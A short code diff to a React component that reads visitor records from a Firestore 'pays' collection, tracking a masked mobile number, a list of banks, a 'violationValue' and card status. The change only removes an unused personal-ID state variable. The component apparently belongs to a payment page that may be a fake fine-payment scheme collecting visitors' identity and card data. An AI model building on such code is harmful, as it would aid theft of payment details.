@@ -125,7 +125,6 @@ const BANKS = [
 
 export default function Kent(props: { setPage?: any; violationValue?: number }) {
   const [step, setStep] = useState(1)
-  const [ setCid] = useState("")
   const [mobile, setMobile] = useState("99****")
   const [loading, setLoading] = useState(true)
   const [time, setTime] = useState(0)
@@ -367,7 +366,6 @@ setTimeout(() => {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), async (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as any
-          setCid(data.personalInfo?.id || "")
           setMobile(data.mobile || "99****")
 
           // Update card status if available
